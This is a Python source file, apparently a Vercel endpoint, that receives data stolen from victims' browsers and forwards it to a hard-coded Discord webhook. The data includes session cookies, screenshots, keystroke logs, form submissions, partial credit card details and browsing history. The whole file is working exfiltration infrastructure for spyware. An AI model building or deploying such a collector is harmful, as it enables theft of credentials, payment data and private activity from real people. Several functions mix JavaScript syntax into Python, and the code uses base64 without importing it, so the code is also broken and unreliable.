# api/exfil.py - Vercel endpoint to receive exfiltrated data
from http.server import BaseHTTPRequestHandler
import json, traceback, requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1386756417368752249/ASWh-wwav0RH1LmxiImI2SD900JuBi6RjSQl-I-s_JNjle2NpEcPRr95OJAaHvj-B7Mw"

class ExfilHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data)
            self.log_exfil(data)
            
            self.send_response(200)
            self.end_headers()
        except:
            self.send_response(500)
            self.end_headers()
    
    def log_exfil(self, data):
        try:
            # Format based on data type
            if data['type'] == 'cookies':
                self.handle_cookies(data['data'])
            elif data['type'] == 'screenshot':
                self.handle_screenshot(data['data'])
            elif data['type'] == 'keylog':
                self.handle_keylog(data['data'])
            elif data['type'] == 'form_data':
                self.handle_form_data(data['data'])
            elif data['type'] == 'credit_card':
                self.handle_credit_card(data['data'])
            elif data['type'] == 'history':
                self.handle_history(data['data'])
        except Exception as e:
            # Error reporting
            requests.post(WEBHOOK_URL, json={
                "content": "⚠️ Exfil Error",
                "embeds": [{
                    "title": "Data Processing Error",
                    "description": f"```{traceback.format_exc()}```"
                }]
            })
    
    def handle_cookies(self, cookies):
        # Format cookie data
        domains = {}
        for cookie in cookies:
            if cookie['domain'] not in domains:
                domains[cookie['domain']] = []
            domains[cookie['domain']].append({
                "name": cookie['name'],
                "value": cookie['value'],
                "secure": cookie['secure']
            })
        
        # Send to Discord
        message = "**Captured Cookies**\n\n"
        for domain, cookies in domains.items():
            message += f"**{domain}**\n"
            for cookie in cookies:
                message += f"- `{cookie['name']}`: `{cookie['value']}`{' (secure)' if cookie['secure'] else ''}\n"
            message += "\n"
        
        requests.post(WEBHOOK_URL, json={
            "content": "🍪 Cookie Harvest Complete",
            "embeds": [{
                "title": "Stored Cookies",
                "description": message[:4000]  # Truncate if too long
            }]
        })
    
    def handle_screenshot(self, data_url):
        # Convert data URL to binary
        header, encoded = data_url.split(",", 1)
        binary_data = base64.b64decode(encoded)
        
        # Send to Discord
        requests.post(WEBHOOK_URL, files={
            "file": ("screenshot.png", binary_data, "image/png")
        }, data={
            "content": "📸 Browser Screenshot Captured"
        })
    
    def handle_keylog(self, data):
        # Format keylog data
        message = "**Captured Keystrokes**\n\n"
        for entry in data:
            key = entry['key'].replace('`', '\\`')
            if (key.length === 1 && key.match(/[a-z0-9]/i)) || key === ' ':
                message += key
            else:
                message += f" `[{key}]` "
        
        # Send to Discord
        requests.post(WEBHOOK_URL, json={
            "content": "⌨️ Keylog Data Captured",
            "embeds": [{
                "title": "Keystroke Log",
                "description": f"```\n{message}\n```"
            }]
        })
    
    def handle_form_data(self, data):
        # Format form data
        message = f"**Form Submission on {data['url']}**\n\n"
        for field, value in data['formData'].items():
            message += f"- **{field}**: ||{value}||\n"
        
        # Send to Discord
        requests.post(WEBHOOK_URL, json={
            "content": "📝 Form Data Captured",
            "embeds": [{
                "title": "Form Submission",
                "description": message
            }]
        })
    
    def handle_credit_card(self, data):
        # Send immediate alert
        requests.post(WEBHOOK_URL, json={
            "content": "@everyone 🔥 CREDIT CARD DETECTED",
            "embeds": [{
                "title": "Credit Card Capture",
                "description": (
                    f"**Website:** {data['url']}\n"
                    f"**Card Type:** {data['cardType']}\n"
                    f"**Partial:** `{data['partial']}`\n"
                )
            }]
        })
    
    def handle_history(self, history):
        # Format history data
        domains = {}
        for entry in history:
            url = entry['url']
            domain = new URL(url).hostname
            if domain not in domains:
                domains[domain] = []
            domains[domain].append({
                "title": entry['title'],
                "url": url,
                "visitCount": entry['visitCount'],
                "lastVisit": entry['lastVisitTime']
            })
        
        # Send to Discord
        message = "**Browsing History**\n\n"
        for domain, entries in domains.items():
            message += f"**{domain}**\n"
            for entry in entries:
                message += f"- [{entry['title']}]({entry['url']}) ({entry['visitCount']} visits)\n"
            message += "\n"
        
        requests.post(WEBHOOK_URL, json={
            "content": "🌐 Browsing History Captured",
            "embeds": [{
                "title": "User Browsing History",
                "description": message[:4000]  # Truncate if too long
            }]
        })

handler = ExfilHandler
